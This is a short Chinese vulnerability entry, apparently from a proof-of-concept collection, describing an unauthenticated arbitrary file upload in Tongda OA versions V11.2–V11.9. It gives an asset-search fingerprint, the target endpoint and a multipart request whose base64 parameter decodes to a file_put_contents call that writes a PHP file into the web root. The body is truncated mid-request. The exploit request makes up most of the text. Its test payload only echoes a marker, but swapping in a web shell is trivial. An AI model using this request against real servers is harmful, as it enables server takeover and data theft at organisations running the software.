# 通达OAapi.ali存在前台任意文件上传漏洞

- **系统**：通达OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /mobile/api/api.ali.php HTTP/1.1`

**请求体 / payload**
```
1. 发起请求，其中参数a`ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIGVjaG8gdnVsbl90ZXN0Oz8+Jyk7`base64解码为`file_put_contents('../../fb6790f4.php','<?php echo vuln_test;?>');`，向页面输出`vuln_test`字符
Content-Type: multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae
Host: 192.168.31.164
Content-Length: 402
--502f67681799b07e4de6b503655f5cae
Content-Disposition: form-data; name="file"; filename="fb6790f4.json"
Content-Type: application/octet-stream
{"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIGVjaG8gdnVsbl90ZXN0Oz8+Jyk7","dataAnalysis":"{\…（脚本共 984 字，完整版见原文）
```

**其他**
- 通达OA api.ali存在前台任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA V11.2-通达OA V11.9